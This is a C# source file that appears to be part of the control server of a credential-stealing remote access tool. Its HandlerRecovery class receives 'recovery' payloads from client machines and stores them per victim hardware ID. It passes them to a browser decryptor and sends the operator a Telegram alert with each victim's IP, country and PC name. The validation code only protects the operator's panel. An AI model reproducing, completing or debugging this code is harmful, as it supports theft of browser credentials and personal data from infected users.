using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Drawing;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Server.Connectings;
using Server.Data;
using Server.Helper;

namespace Server.Messages;

internal class HandlerRecovery
{
	private static readonly char[] InvalidPathChars = Path.GetInvalidPathChars();

	private static readonly char[] InvalidFileNameChars = Path.GetInvalidFileNameChars();

	private static readonly ConcurrentDictionary<string, DateTime> _lastRequestTime = new ConcurrentDictionary<string, DateTime>();

	private static readonly TimeSpan _requestCooldown = TimeSpan.FromSeconds(30.0);

	public static void Read(Clients clients, object[] array)
	{
		if (clients == null || array == null || array.Length < 3)
		{
			clients?.Disconnect();
			return;
		}
		string hwid = clients.Hwid;
		if (!string.IsNullOrEmpty(hwid) && !Regex.IsMatch(hwid, "^[0-9a-fA-F]{32}$"))
		{
			Methods.AppendLogs(clients.IP, "RCE Attack Blocked! (HandlerRecovery)", Color.Red);
			clients.Disconnect();
			return;
		}
		if (!string.IsNullOrEmpty(hwid))
		{
			if (_lastRequestTime.TryGetValue(hwid, out var lastRequest) && DateTime.UtcNow - lastRequest < _requestCooldown)
			{
				Methods.AppendLogs(clients.IP, "RCE Attack Blocked! Spam detected from HWID: " + hwid, Color.Red);
				clients.Disconnect();
				return;
			}
			_lastRequestTime[hwid] = DateTime.UtcNow;
		}
		string userId = array[1] as string;
		byte[] payload = array[2] as byte[];
		if (string.IsNullOrWhiteSpace(userId) || payload == null)
		{
			clients.Disconnect();
			return;
		}
		if (!Regex.IsMatch(userId, "^[0-9a-fA-F]{32}$"))
		{
			Methods.AppendLogs(clients.IP, "RCE Attack Blocked! (HandlerRecovery)", Color.Red);
			clients.Disconnect();
			return;
		}
		if (userId.IndexOfAny(InvalidPathChars) >= 0 || userId.IndexOfAny(InvalidFileNameChars) >= 0)
		{
			clients.Disconnect();
			return;
		}
		if (userId.Contains("..") || userId.StartsWith(".") || userId.EndsWith("."))
		{
			clients.Disconnect();
			return;
		}
		string sanitizedUserId = SecurityHelper.SanitizeHwid(userId);
		if (string.IsNullOrWhiteSpace(sanitizedUserId) || sanitizedUserId == "InvalidHWID")
		{
			clients.Disconnect();
			return;
		}
		string userBasePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Users", sanitizedUserId);
		string recoveryPath = Path.Combine(userBasePath, "Recovery");
		if (!SecurityHelper.IsSafePath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Users"), sanitizedUserId))
		{
			clients.Disconnect();
			return;
		}
		try
		{
			Methods.AppendLogs(clients.IP, "Save logs in: " + recoveryPath, Color.MediumPurple);
			bool isNewUser = !Directory.Exists(userBasePath);
			if (!Directory.Exists(userBasePath))
			{
				Directory.CreateDirectory(userBasePath);
			}
			if (!Directory.Exists(recoveryPath))
			{
				Directory.CreateDirectory(recoveryPath);
			}
			if (PaleFileProtocol.Unpack(recoveryPath, payload))
			{
				Methods.AppendLogs(clients.IP, "Recovery saved to Users\\" + sanitizedUserId + "\\Recovery", Color.Green);
				DecryptorBrowsers.Start(recoveryPath);
				Settings s = Program.form?.settings;
				if (s == null || string.IsNullOrEmpty(s.TelegramBotToken) || string.IsNullOrEmpty(s.TelegramChatID) || (!s.Notificator && !s.TelegramConnect && !s.TelegramNewConnect))
				{
					return;
				}
				string clientHwid = sanitizedUserId;
				string clientUserPc = "Unknown";
				string clientIp = "Unknown";
				string clientCountry = "Unknown";
				try
				{
					if (Program.form?.GridClients != null)
					{
						foreach (DataGridViewRow row in (IEnumerable)Program.form.GridClients.Rows)
						{
							if (row.Cells.Count > 6 && row.Cells[6].Value != null && row.Cells[6].Value.ToString() == sanitizedUserId)
							{
								if (row.Cells.Count > 1 && row.Cells[1].Value != null)
								{
									clientIp = row.Cells[1].Value.ToString();
								}
								if (row.Cells.Count > 3 && row.Cells[3].Value != null)
								{
									clientCountry = row.Cells[3].Value.ToString();
								}
								if (row.Cells.Count > 7 && row.Cells[7].Value != null)
								{
									clientUserPc = row.Cells[7].Value.ToString();
								}
								break;
							}
						}
					}
				}
				catch
				{
				}
				TelegramNotificator.SendRecoveryWithNotification(clientHwid, clientUserPc, clientIp, clientCountry, isNewUser, recoveryPath, s.TelegramBotToken, s.TelegramChatID);
			}
			else
			{
				Methods.AppendLogs(clients.IP, "Recovery unpack failed (invalid payload format)", Color.Red);
			}
		}
		catch (Exception ex)
		{
			Methods.AppendLogs(clients.IP, "Recovery Error: " + ex.Message, Color.Red);
		}
		finally
		{
			clients.Disconnect();
		}
	}
}
